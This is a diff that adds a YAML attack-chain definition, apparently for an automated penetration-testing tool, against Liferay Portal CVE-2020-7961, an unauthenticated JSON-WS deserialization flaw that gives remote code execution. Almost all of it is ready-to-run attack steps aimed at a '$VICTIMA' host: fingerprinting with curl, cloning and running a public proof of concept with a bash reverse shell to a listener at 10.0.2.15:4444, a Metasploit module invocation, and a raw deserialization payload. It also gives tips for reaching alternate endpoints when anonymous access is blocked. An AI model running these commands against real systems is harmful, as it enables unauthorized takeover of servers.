@@ -1,0 +1,57 @@
+chain_id: liferay_cve_2020_7961
+title: "Liferay Portal — CVE-2020-7961 unauth JSON-WS deserialization → RCE"
+severity: CRITICAL
+tags: [web, liferay, cve-2020-7961, json-ws, deserialization, rce]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2020-7961" }
+    - { banner_pattern: "(?i)liferay" }
+    - { product_pattern: "(?i)liferay" }
+    - { path_pattern: "(?i)/api/(jsonws|liferay-portlet)" }
+
+description: |
+  Liferay Portal 6.x / 7.0 GA1–7.0 CE GA7 / 7.1 CE GA1–GA3 / 7.2 CE
+  GA1: the `/api/jsonws` endpoint deserializes JSON into Java objects
+  with no whitelist. POST a serialized
+  `com.mchange.v2.c3p0.WrapperConnectionPoolDataSource` and the
+  ClassReloadingFactory loads attacker-supplied bytecode → unauth RCE
+  as the liferay user.
+
+steps:
+  - id: 1
+    title: "Fingerprint Liferay version"
+    command: |
+      curl -sk "https://$VICTIMA/api/jsonws" -I
+      curl -sk "https://$VICTIMA/" | grep -Ei 'liferay|portal'
+
+  - id: 2
+    title: "Run the public PoC"
+    command: |
+      git clone https://github.com/mzer0one/CVE-2020-7961-POC /tmp/liferay
+      python3 /tmp/liferay/CVE-2020-7961.py -u http://$VICTIMA \
+        -c 'bash -c "bash -i >& /dev/tcp/10.0.2.15/4444 0>&1"'
+
+  - id: 3
+    title: "Or with Metasploit"
+    command: |
+      msfconsole -qx 'use exploit/multi/http/liferay_java_unmarshalling; \
+        set RHOSTS $VICTIMA; set TARGETURI / ; \
+        set LHOST 10.0.2.15; set LPORT 4444; run'
+
+  - id: 4
+    title: "Direct payload — JSON to /api/jsonws/expandocolumn/add-column"
+    command: |
+      curl -sk "https://$VICTIMA/api/jsonws/expandocolumn/add-column" \
+        -d 'tableId=0&name=rootctl&type=0&defaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource={"userOverridesAsString":"HexAsciiSerializedMap:<gadget-bytes>;"}'
+
+common_errors:
+  - error: "/api/jsonws returns 401"
+    solution: |
+      `web.xml` filter blocks anonymous access (good). Check
+      `/api/liferay-portlet` and `/api/secure/jsonws` — same gadget,
+      different mount path on some installs.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2020-7961
+  - https://www.code-white.com/blog/liferay-portal-json-vulns/
